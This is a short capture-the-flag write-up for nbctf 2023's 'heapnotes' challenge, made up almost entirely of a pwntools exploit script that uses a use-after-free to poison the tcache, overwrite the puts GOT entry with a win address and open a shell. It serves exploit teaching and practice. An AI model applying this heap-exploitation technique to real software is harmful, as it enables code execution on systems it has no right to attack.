```python
from pwn import *  
  
  
elf = context.binary = ELF("./heapnotes_patched", checksec=True)  
libc = elf.libc  
#context.log_level = "debug"  
  
gs = """  
continue"""  
  
def start():  
 with context.quiet:  
   if args.GDB:  
     return gdb.debug(elf.path, gdbscript=gs, api=True)  
   elif args.REMOTE:  
     return remote(host, port)  
   else:  
     return process(elf.path)  
  
io = start()  
#io = remote("chal.nbctf.com", 30172)  
io.timeout = 1  
  
  
def malloc(data):  
   io.sendlineafter(b"> ", b"1")  
   io.sendlineafter(b": ", data)  
  
def free(index):  
   io.sendlineafter(b"> ", b"4")  
   io.sendlineafter(b": ", str(index).encode())  
  
def uaf(index, data):  
   io.sendlineafter(b"> ", b"3")  
   io.sendlineafter(b": ", str(index).encode())  
   io.sendlineafter(b": ", data)  
  
  
malloc(b"cafebabe")  # filler chunk so we can gain an actual FD on the second chunk  
malloc(b"pwnpwnwp")  # our chunk we will be using for our uaf->tcache poison  
  
free(0)  # first chunk to get freed in tcache always points to NULL, FD=NULL  
free(1)  # gain a forward ptr, we will overwrite the tcache FD with puts got and then overwrite puts got with the win address  
got_puts = p64(0x404020)  
uaf(1, got_puts)  # overwrite the FD with puts got  
malloc(b"beefdead")  # remove chunk from tcache  
malloc(p64(0x401276))  # overwrite puts got with the win address  
  
io.interactive()  
```  
  
---
## **Heaped-notes** `nbctf` 2023 write-up 
- we can malloc static sizes, free any chunk, write to any chunk and read from any chunk.
- i decided to go with a use-after-free->tcache poison.
- i overwrite got puts with the win address and popped a shell, ez.